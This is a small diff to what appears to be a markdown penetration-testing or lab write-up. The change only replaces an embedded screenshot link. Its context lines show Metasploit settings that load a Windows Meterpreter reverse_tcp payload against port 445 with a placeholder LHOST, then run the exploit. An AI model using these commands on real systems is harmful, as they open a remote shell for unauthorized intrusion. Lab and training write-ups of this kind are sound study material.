@@ -81,7 +81,8 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <Your_IP>
 set RPORT 445
 exploit
-![{D5A03649-C44F-4621-AE17-6C592AF541AB}.png](attachment:28cfd24d-4b7c-4644-a811-e21069410cf8:D5A03649-C44F-4621-AE17-6C592AF541AB.png)
+![{0C060B30-2C65-417D-8B85-96E0EC19DCAC}](https://github.com/user-attachments/assets/fee93c15-d24a-45a7-acd8-96c35992b576)
+
 ```
 
 ---
